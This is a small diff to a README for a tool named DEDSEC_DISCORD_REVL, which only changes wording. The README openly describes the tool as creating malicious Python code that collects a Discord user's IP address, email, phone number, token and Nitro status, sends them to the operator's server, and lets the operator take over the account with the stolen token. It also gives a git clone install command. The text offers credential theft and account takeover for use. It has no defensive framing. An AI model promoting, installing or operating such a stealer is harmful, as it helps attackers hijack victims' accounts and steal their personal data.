@@ -6,7 +6,7 @@
 <h4 align="center">DEDSEC_DISCORD_REVL is a linux based tool that can dump discord user information like userid, user ip, email, phonenumber, token, nitro, etc .</h4>
 
 ## DESCRIPTION
-DEDSEC_DISCORD_REVL is capable of creating a malicious python code. When the user uses this code, their discord account information, such as public ip address, user_id, user email, phonenumber, token, nitro, etc., will be obtained and automatically sent to your server and you can fully take over their account account and take control of it using token.
+DEDSEC_DISCORD_REVL is capable of creating a malicious python code. When the user uses this code, their discord account information, such as public ip address, user_id, email, phonenumber, token, nitro, etc, will be obtained and automatically sent to your server and you can fully take over their account account and take control of it using token.
 
 ## INSTALLATION 
     * git clone https://github.com/0xbitx/DEDSEC_DISCORD_REVL.git
